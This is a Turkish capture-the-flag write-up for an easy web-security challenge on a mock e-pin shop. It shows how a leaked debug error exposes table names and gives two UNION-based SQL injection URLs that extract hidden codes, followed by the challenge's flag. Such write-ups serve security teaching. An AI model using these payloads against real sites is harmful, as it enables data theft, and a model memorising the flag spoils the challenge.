# Root Epin

 |    |  |
 | ------------- |-------------|
 | Zorluk        | Kolay (200 Puan)|
 | Aşama         | Yarı Final   |
 | Soru Türü     | Web Güvenliği |
 | Yazar(lar)    | [Oğuzhan Akay](https://github.com/oguzhanakayy) |


## Soru Metni
Kodları piyasa fiyatının üstünde satan ROOT Epin'in sisteminde bir açık keşfedildi. Bu açığı kullanarak gizli  kodu bulabilir misin?

## Çözüm Adımları:

1. İlk olarak siteye girdiğimizde normal bir e-pin satış sitesi görüyoruz. Ürünlere tıkladığımızda detail.php?id=X şeklinde bir URL yapısı olduğunu görüyoruz.

2. Sayfa kaynağını incelediğimizde bazı ilginç yorum satırları dikkatimizi çekiyor:
   ```html
   <!--  'kodlar' -->
   ```

3. Hatalı bir id değeri denediğimizde (örneğin detail.php?id=999) şöyle bir hata mesajı alıyoruz:
   ```
   Ürün bulunamadı. (Debug: Sorgu başarısız - Tablo yapısı: products(id,name,description,price) | kodlar(id,urun_kodu,gizli_kod))
   ```

4. Bu bilgiler bize:
   - 'kodlar' adında bir tablo olduğunu
   - Bu tabloda 'urun_kodu' ve 'gizli_kod' sütunları olduğunu
   - Veritabanında products tablosunun 4 sütunu olduğunu gösteriyor

5. Burda yarışmacı 1 den fazlaSQL Injection denemesi yapabilir. Örnek:

   Basit deneme:
   ```
   http://localhost/epin-project/detail.php?id=-1 UNION SELECT 1,urun_kodu,gizli_kod,1 FROM kodlar
   ```

   veya:
   ```
   http://localhost/epin-project/detail.php?id=1 AND 1=0 UNION SELECT 1,urun_kodu,gizli_kod,1 FROM kodlar
   ```

6. Bu payload çalıştığında flag'i elde ediyoruz:
   ```
   QmF5cmFrQmVuZGV7WTNOMV9TM1QxX0IzRzNORDFOTTF9
   ```

7. base64 ile encode edilmiş stringi decode ediyoruz

# Flag
```
BayrakBende{Y3N1_S3T1_B3G3ND1NM1}
```


